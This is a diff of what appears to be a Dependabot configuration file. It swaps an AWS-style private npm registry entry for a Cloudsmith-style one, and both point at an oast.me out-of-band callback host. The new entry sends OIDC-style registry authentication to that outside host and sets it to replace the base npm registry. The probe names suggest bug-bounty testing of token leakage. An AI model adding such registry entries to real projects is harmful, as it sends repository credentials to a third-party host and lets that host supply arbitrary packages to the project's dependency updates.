@@ -1,18 +1,17 @@
 version: 2
 registries:
-  bb-aws-region:
+  bb-cloudsmith:
     type: npm-registry
-    url: https://da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me/arm-aws
-    aws-region: us-east-1.da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me
-    account-id: "123456789012"
-    role-name: bb-probe-role-0827
-    domain: bb-probe-domain
-    domain-owner: "123456789012"
-    audience: bb-probe-aud-aws-0827
+    url: https://da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me/arm-cs
+    namespace: bb-probe-org-0827
+    service-slug: bb-probe-svc-0827
+    api-host: da7od3e358616t5p6ck0asttg1ttkt4q3.oast.me
+    audience: bb-probe-aud-cs-0827
+    replaces-base: true
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule:
       interval: "daily"
     registries:
-      - bb-aws-region
+      - bb-cloudsmith
